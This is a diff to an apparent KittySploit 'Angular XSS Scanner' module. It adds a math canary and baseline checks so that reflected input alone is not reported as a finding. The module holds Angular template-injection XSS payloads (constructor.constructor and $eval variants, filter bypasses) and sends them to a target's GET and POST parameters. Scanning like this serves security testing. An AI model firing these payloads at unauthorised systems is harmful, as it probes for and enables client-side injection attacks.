@@ -1,355 +1,400 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-from kittysploit import *
-from lib.protocols.http.http_client import Http_client
+from __future__ import annotations
+
 import re
 import urllib.parse
+from typing import Any, Dict, List, Optional, Tuple
+
+from kittysploit import *
+from lib.protocols.http.http_client import Http_client
+
+
+# Unique product unlikely to appear on normal pages (avoids "49" / year false positives).
+_EVAL_A, _EVAL_B = 1337, 7331
+_EVAL_RESULT = str(_EVAL_A * _EVAL_B)  # 9801547
+_MATH_PAYLOAD = f"{{{{{_EVAL_A}*{_EVAL_B}}}}}"
+
+_ANGULAR_INDICATORS = (
+    "ng-app",
+    "ng-controller",
+    "ng-version",
+    "angular.js",
+    "angular.min.js",
+    "angularjs",
+    "[ng-",
+    "*ng-",
+    "ng-bind",
+    "ng-model",
+)
 
 
 class Module(Auxiliary, Http_client):
 
     __info__ = {
-        'name': 'Angular XSS Scanner',
-        'description': 'Scans for Angular-specific XSS vulnerabilities including template injection, expression injection, and unsafe binding vulnerabilities',
-        'author': 'KittySploit Team',
-        'tags': ['web', 'angular', 'xss', 'scanner', 'security', 'injection'],
-        'references': [
-            'https://owasp.org/www-community/attacks/xss/',
-            'https://angular.io/guide/security',
-            'https://portswigger.net/web-security/cross-site-scripting',
+        "name": "Angular XSS Scanner",
+        "description": (
+            "Scans for Angular-specific XSS / template expression injection. "
+            "Requires Angular indicators and confirmed expression evaluation "
+            "(reflection alone is not treated as a finding)."
+        ),
+        "author": "KittySploit Team",
+        "tags": ["web", "angular", "xss", "scanner", "security", "injection"],
+        "references": [
+            "https://owasp.org/www-community/attacks/xss/",
+            "https://angular.io/guide/security",
+            "https://portswigger.net/web-security/cross-site-scripting",
         ],
-    'agent': {
-        'risk': 'active',
-        'effects': ['network_probe'],
-        'expected_requests': 2,
-        'reversible': True,
-        'approval_required': False,
-        'produces': ['tech_hints', 'risk_signals', 'endpoints', 'params'],
-        'cost': 1.0,
-        'noise': 0.5,
-        'value': 1.0,
-        'requires':         {'min_endpoints': 0,
-         'min_params': 0,
-         'tech_hints_any': [],
-         'tech_hints_all': [],
-         'specializations_any': [],
-         'risk_signals_any': [],
-         'auth_session': False,
-         'capabilities_any': [],
-         'capabilities_all': [],
-         'confidence_min': {},
-         'confidence_min_any': {},
-         'endpoint_pattern_any': [],
-         'param_any': [],
-         'api_surface_ready': False},
-        'chain':         {'produces_capabilities': [{'capability': 'endpoints', 'from_detail': ''}],
-         'consumes_capabilities': [],
-         'option_bindings': {},
-         'suggested_followups': []},
-    },
+        "agent": {
+            "risk": "active",
+            "effects": ["network_probe"],
+            "expected_requests": 8,
+            "reversible": True,
+            "approval_required": False,
+            "produces": ["tech_hints", "risk_signals", "endpoints", "params"],
+            "cost": 1.0,
+            "noise": 0.4,
+            "value": 1.0,
+            "requires": {
+                "min_endpoints": 0,
+                "min_params": 0,
+                "tech_hints_any": ["angular", "angularjs"],
+                "tech_hints_all": [],
+                "specializations_any": [],
+                "risk_signals_any": [],
+                "auth_session": False,
+                "capabilities_any": [],
+                "capabilities_all": [],
+                "confidence_min": {},
+                "confidence_min_any": {},
+                "endpoint_pattern_any": [],
+                "param_any": [],
+                "api_surface_ready": False,
+            },
+            "chain": {
+                "produces_capabilities": [{"capability": "endpoints", "from_detail": ""}],
+                "consumes_capabilities": [],
+                "option_bindings": {},
+                "suggested_followups": [],
+            },
+        },
     }
 
-    # Angular XSS payloads
+    # Probe payloads: math canary first; constructor probes only count on evaluation.
     ANGULAR_PAYLOADS = [
-        # Template injection payloads
+        _MATH_PAYLOAD,
+        '{{constructor.constructor("return 1+1")()}}',
+        '{{$eval.constructor("return 1+1")()}}',
         '{{constructor.constructor("alert(1)")()}}',
-        '{{$eval.constructor("alert(1)")()}}',
-        '{{$new.constructor("alert(1)")()}}',
-        '{{$get.constructor("alert(1)")()}}',
-        '{{$apply.constructor("alert(1)")()}}',
-        '{{$compile.constructor("alert(1)")()}}',
-        '{{constructor.constructor("return process")()}}',
-        '{{$eval("constructor.constructor(\'return process\')()")}}',
-        
-        # Expression injection payloads
-        '{{7*7}}',
-        '{{7*7}}={{49}}',
-        '{{1+1}}',
-        '{{constructor}}',
-        '{{$eval}}',
-        '{{$new}}',
-        '{{$get}}',
-        '{{$apply}}',
-        '{{$compile}}',
-        
-        # AngularJS specific
         '{{$on.constructor("alert(1)")()}}',
         '{{$watch.constructor("alert(1)")()}}',
-        '{{$root.constructor("alert(1)")()}}',
-        '{{$scope.constructor("alert(1)")()}}',
-        
-        # Angular 2+ specific
-        '{{constructor.constructor("return this")().process}}',
-        '{{constructor.constructor("return global")().process}}',
-        
-        # Bypass filters
         '{{constructor["constructor"]("alert(1)")()}}',
-        '{{constructor[`constructor`]("alert(1)")()}}',
-        '{{constructor.constructor`alert(1)```()}}',
     ]
 
-    # Parameter names commonly used with Angular
     ANGULAR_PARAMS = [
-        'q', 'query', 'search', 'filter', 'sort', 'order',
-        'name', 'value', 'id', 'key', 'data', 'input',
-        'template', 'expression', 'eval', 'compile',
-        'callback', 'jsonp', 'format', 'output'
+        "q",
+        "query",
+        "search",
+        "filter",
+        "sort",
+        "order",
+        "name",
+        "value",
+        "id",
+        "key",
+        "template",
+        "expression",
+        "callback",
     ]
+
+    force_scan = OptBool(
+        False,
+        "Run even when Angular is not detected on the target",
+        required=False,
+    )
 
     def check(self):
-        """
-        Check if the target is accessible and might be using Angular
-        """
         try:
             response = self.http_request(method="GET", path="/")
-            if response:
-                # Check for Angular indicators
-                content = response.text.lower()
-                if any(indicator in content for indicator in ['ng-app', 'angular', '[ng-', '*ng-', 'angularjs']):
-                    return True
-                # Check headers
-                headers = str(response.headers).lower()
-                if 'angular' in headers:
-                    return True
-                # Even if not detected, continue scanning
+            if not response:
+                return False
+            if self._body_has_angular(response.text or "", response.headers):
                 return True
-            return False
-        except Exception as e:
+            return bool(self.force_scan)
+        except Exception:
             return False
 
-    def detect_angular_version(self):
-        """
-        Detect Angular version from response
-        """
+    def _body_has_angular(self, content: str, headers: Any = None) -> bool:
+        low = (content or "").lower()
+        if any(token in low for token in _ANGULAR_INDICATORS):
+            return True
+        header_blob = str(headers or "").lower()
+        return "angular" in header_blob
+
+    def detect_angular_version(self) -> Optional[str]:
         try:
             response = self.http_request(method="GET", path="/")
             if not response:
                 return None
-            
-            content = response.text
-            
-            # Check for Angular version in script tags
-            version_match = re.search(r'angular[\.-]?(\d+\.\d+\.\d+)', content, re.IGNORECASE)
+
+            content = response.text or ""
+            version_match = re.search(
+                r"angular[\.-]?(\d+\.\d+\.\d+)", content, re.IGNORECASE
+            )
             if version_match:
                 return version_match.group(1)
-            
-            # Check for ng-version attribute
-            ng_version_match = re.search(r'ng-version=["\']([^"\']+)["\']', content, re.IGNORECASE)
+
+            ng_version_match = re.search(
+                r'ng-version=["\']([^"\']+)["\']', content, re.IGNORECASE
+            )
             if ng_version_match:
                 return ng_version_match.group(1)
-            
-            # Check for AngularJS
-            if 'angularjs' in content.lower() or 'ng-app' in content.lower():
-                return 'AngularJS (1.x)'
-            
-            # Check for Angular 2+
-            if 'angular' in content.lower() and ('[ng-' in content or '*ng-' in content):
-                return 'Angular 2+'
-            
+
+            low = content.lower()
+            if "angularjs" in low or "ng-app" in low:
+                return "AngularJS (1.x)"
+            if "angular" in low and ("[ng-" in content or "*ng-" in content):
+                return "Angular 2+"
+            if self._body_has_angular(content, response.headers):
+                return "Angular (unversioned)"
             return None
-        except Exception as e:
-            print_debug(f"Error detecting Angular version: {str(e)}")
+        except Exception as exc:
+            print_debug(f"Error detecting Angular version: {exc}")
             return None
 
-    def test_xss_payload(self, payload, param_name='q'):
-        """
-        Test an XSS payload against a parameter
-        
-        Args:
-            payload: The XSS payload to test
-            param_name: Parameter name to inject into
-            
-        Returns:
-            dict: Test results
-        """
+    def _baseline_body(self, param_name: str, method: str = "GET") -> str:
+        canary = "kittysploit_angular_baseline"
         try:
-            # URL encode the payload
-            encoded_payload = urllib.parse.quote(payload)
-            
-            # Test in query parameter
-            test_path = f"/?{param_name}={encoded_payload}"
-            response = self.http_request(
-                method="GET",
-                path=test_path,
-                allow_redirects=False
-            )
-            
-            if not response:
-                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
-            
-            # Check if payload is reflected
-            is_reflected = payload in response.text or encoded_payload in response.text
-            
-            # Check for Angular expression evaluation
-            is_evaluated = False
-            if '{{' in payload and '}}' in payload:
-                # Check if expression was evaluated (e.g., {{7*7}} becomes 49)
-                expr_match = re.search(r'\{\{(\d+)\*(\d+)\}\}', payload)
-                if expr_match:
-                    expected_result = str(int(expr_match.group(1)) * int(expr_match.group(2)))
-                    if expected_result in response.text:
-                        is_evaluated = True
-            
-            # Check for JavaScript execution indicators
-            js_indicators = ['<script', 'javascript:', 'onerror=', 'onload=', 'alert(']
-            has_js_indicators = any(indicator in response.text.lower() for indicator in js_indicators)
-            
-            vulnerable = is_reflected or is_evaluated
-            
-            return {
-                'payload': payload,
-                'param': param_name,
-                'path': test_path,
-                'vulnerable': vulnerable,
-                'is_reflected': is_reflected,
-                'is_evaluated': is_evaluated,
-                'has_js_indicators': has_js_indicators,
-                'status_code': response.status_code,
-                'response_length': len(response.text)
-            }
-            
-        except Exception as e:
-            return {
-                'payload': payload,
-                'param': param_name,
-                'vulnerable': False,
-                'error': str(e)
-            }
+            if method.upper() == "POST":
+                response = self.http_request(
+                    method="POST",
+                    path="/",
+                    data={param_name: canary},
+                )
+            else:
+                response = self.http_request(
+                    method="GET",
+                    path=f"/?{param_name}={canary}",
+                    allow_redirects=False,
+                )
+            return (response.text or "") if response else ""
+        except Exception:
+            return ""
 
-    def test_post_xss(self, payload, param_name='data'):
-        """
-        Test XSS payload via POST request
-        
-        Args:
-            payload: The XSS payload to test
-            param_name: Parameter name to inject into
-            
-        Returns:
-            dict: Test results
-        """
-        try:
-            # Test POST with form data
-            post_data = {param_name: payload}
-            response = self.http_request(
-                method="POST",
-                path="/",
-                data=post_data
+    def _expression_evaluated(
+        self,
+        payload: str,
+        body: str,
+        baseline: str,
+    ) -> Tuple[bool, str]:
+        """Return (evaluated, reason). Reflection of the raw payload is never enough."""
+        if not body:
+            return False, ""
+
+        # Math canary: result must appear, not be present in baseline, and
+        # raw template markers for that expression should be gone or rewritten.
+        expr_match = re.search(r"\{\{(\d+)\*(\d+)\}\}", payload)
+        if expr_match:
+            expected = str(int(expr_match.group(1)) * int(expr_match.group(2)))
+            if expected in baseline:
+                return False, ""
+            if expected not in body:
+                return False, ""
+            # If the full payload is still reflected unchanged, it was not evaluated.
+            if payload in body:
+                return False, ""
+            encoded = urllib.parse.quote(payload)
+            if encoded in body:
+                return False, ""
+            return True, f"expression_evaluated:{expected}"
+
+        # Constructor / $eval probes: require a clear evaluation side-effect.
+        # Alert payloads cannot be confirmed server-side from HTML alone; skip
+        # unless a distinct numeric canary was returned (handled above).
+        if "constructor" in payload or "$eval" in payload:
+            # Soft signal only when Angular-like sandbox error / eval residue appears
+            # without reflecting the full raw payload (common with AngularJS CSTI).
+            if payload in body:
+                return False, ""
+            residues = (
+                "constructor is not defined",
+                "[object Object]",
+                "ReferenceError",
             )
-            
+            hit = next((item for item in residues if item in body and item not in baseline), None)
+            if hit:
+                return True, f"angular_eval_residue:{hit}"
+        return False, ""
+
+    def test_xss_payload(
+        self,
+        payload: str,
+        param_name: str = "q",
+        *,
+        baseline: str = "",
+        method: str = "GET",
+    ) -> Dict[str, Any]:
+        try:
+            if method.upper() == "POST":
+                response = self.http_request(
+                    method="POST",
+                    path="/",
+                    data={param_name: payload},
+                )
+                test_path = "/"
+            else:
+                encoded_payload = urllib.parse.quote(payload)
+                test_path = f"/?{param_name}={encoded_payload}"
+                response = self.http_request(
+                    method="GET",
+                    path=test_path,
+                    allow_redirects=False,
+                )
+
             if not response:
-                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
-            
-            # Check if payload is reflected
-            is_reflected = payload in response.text
-            
+                return {
+                    "payload": payload,
+                    "param": param_name,
+                    "method": method.upper(),
+                    "vulnerable": False,
+                    "error": "No response",
+                }
+
+            body = response.text or ""
+            is_reflected = payload in body or urllib.parse.quote(payload) in body
+            is_evaluated, reason = self._expression_evaluated(payload, body, baseline)
+            # Reflection alone is a false positive for Angular CSTI / XSS.
+            vulnerable = bool(is_evaluated)
+
             return {
-                'payload': payload,
-                'param': param_name,
-                'method': 'POST',
-                'vulnerable': is_reflected,
-                'is_reflected': is_reflected,
-                'status_code': response.status_code
+                "payload": payload,
+                "param": param_name,
+                "path": test_path,
+                "method": method.upper(),
+                "vulnerable": vulnerable,
+                "is_reflected": is_reflected,
+                "is_evaluated": is_evaluated,
+                "evidence": reason,
+                "status_code": response.status_code,
+                "response_length": len(body),
             }
-            
-        except Exception as e:
+        except Exception as exc:
             return {
-                'payload': payload,
-                'param': param_name,
-                'vulnerable': False,
-                'error': str(e)
+                "payload": payload,
+                "param": param_name,
+                "method": method.upper(),
+                "vulnerable": False,
+                "error": str(exc),
             }
 
     def run(self):
-        """
-        Execute the Angular XSS scan
-        """
-        self.vulnerabilities = []
-        self.test_results = []
-        
+        self.vulnerabilities: List[Dict[str, Any]] = []
+        self.test_results: List[Dict[str, Any]] = []
+
         print_status("Starting Angular XSS scan...")
         print_info(f"Target: {self.target}")
         print_info("")
-        
-        # Detect Angular version
+
         print_status("Detecting Angular version...")
         version = self.detect_angular_version()
+        angular_present = bool(version)
+        if not angular_present:
+            # Re-check body indicators without a version string.
+            probe = self.http_request(method="GET", path="/")
+            angular_present = bool(
+                probe and self._body_has_angular(probe.text or "", probe.headers)
+            )
+
         if version:
             print_success(f"Angular version detected: {version}")
+        elif angular_present:
+            print_success("Angular indicators detected (version unknown)")
         else:
-            print_warning("Could not detect Angular version")
-            print_info("Continuing with generic Angular XSS tests...")
+            print_warning("Angular not detected")
+            if not self.force_scan:
+                print_info(
+                    "Skipping Angular XSS probes (reflection without Angular "
+                    "is not a vulnerability). Set force_scan=true to override."
+                )
+                print_info("No Angular XSS vulnerabilities detected.")
+                return True
+            print_info("force_scan enabled — continuing without Angular confirmation")
         print_info("")
-        
-        # Test GET parameters
-        print_status("Testing GET parameters for XSS vulnerabilities...")
+
+        print_status("Testing GET parameters for Angular expression injection...")
         print_info("")
-        
+
         for param in self.ANGULAR_PARAMS:
             print_info(f"Testing parameter: {param}")
-            
-            for i, payload in enumerate(self.ANGULAR_PAYLOADS[:10], 1):  # Test first 10 payloads per param
-                result = self.test_xss_payload(payload, param)
+            baseline = self._baseline_body(param, "GET")
+            for payload in self.ANGULAR_PAYLOADS:
+                result = self.test_xss_payload(
+                    payload, param, baseline=baseline, method="GET"
+                )
                 self.test_results.append(result)
-                
-                if result.get('vulnerable'):
-                    print_success(f"  [!] Potential XSS found with payload: {payload[:50]}...")
+                if result.get("vulnerable"):
+                    print_success(
+                        f"  [!] Confirmed expression evaluation with payload: {payload[:50]}..."
+                    )
                     print_info(f"      Parameter: {param}")
-                    print_info(f"      Reflected: {result.get('is_reflected', False)}")
-                    print_info(f"      Evaluated: {result.get('is_evaluated', False)}")
+                    print_info(f"      Evidence: {result.get('evidence', '')}")
                     self.vulnerabilities.append(result)
-        
+
         print_info("")
-        
-        # Test POST parameters
-        print_status("Testing POST parameters for XSS vulnerabilities...")
+        print_status("Testing POST parameters for Angular expression injection...")
         print_info("")
-        
-        for param in self.ANGULAR_PARAMS[:5]:  # Test first 5 params via POST
+
+        for param in self.ANGULAR_PARAMS[:5]:
             print_info(f"Testing POST parameter: {param}")
-            
-            for payload in self.ANGULAR_PAYLOADS[:5]:  # Test first 5 payloads
-                result = self.test_post_xss(payload, param)
+            baseline = self._baseline_body(param, "POST")
+            for payload in self.ANGULAR_PAYLOADS[:3]:
+                result = self.test_xss_payload(
+                    payload, param, baseline=baseline, method="POST"
+                )
                 self.test_results.append(result)
-                
-                if result.get('vulnerable'):
-                    print_success(f"  [!] Potential XSS found (POST) with payload: {payload[:50]}...")
+                if result.get("vulnerable"):
+                    print_success(
+                        f"  [!] Confirmed expression evaluation (POST): {payload[:50]}..."
+                    )
                     print_info(f"      Parameter: {param}")
                     self.vulnerabilities.append(result)
-        
+
         print_info("")
-        
-        # Summary
         print_status("=" * 60)
         print_status("Angular XSS Scan Summary")
         print_status("=" * 60)
-        
+
         if version:
             print_info(f"Angular Version: {version}")
+        elif angular_present:
+            print_info("Angular Version: detected (unversioned)")
         else:
             print_warning("Angular Version: Not detected")
-        
+
         print_info(f"Total tests performed: {len(self.test_results)}")
         print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
         print_status("=" * 60)
         print_info("")
-        
+
         if self.vulnerabilities:
-            print_success("Vulnerabilities detected:")
+            print_success("Confirmed Angular expression injection:")
             print_info("")
-            
             table_data = []
-            for vuln in self.vulnerabilities[:20]:  # Show first 20
-                payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
-                table_data.append([
-                    vuln.get('param', 'N/A'),
-                    vuln.get('method', 'GET'),
-                    payload_short,
-                    'Yes' if vuln.get('is_evaluated') else ('Reflected' if vuln.get('is_reflected') else 'No')
-                ])
-            
-            print_table(['Parameter', 'Method', 'Payload', 'Status'], table_data)
+            for vuln in self.vulnerabilities[:20]:
+                payload_short = vuln["payload"][:40] + (
+                    "..." if len(vuln["payload"]) > 40 else ""
+                )
+                table_data.append(
+                    [
+                        vuln.get("param", "N/A"),
+                        vuln.get("method", "GET"),
+                        payload_short,
+                        vuln.get("evidence") or "evaluated",
+                    ]
+                )
+            print_table(["Parameter", "Method", "Payload", "Evidence"], table_data)
         else:
             print_info("No Angular XSS vulnerabilities detected.")
-        
+
         return True
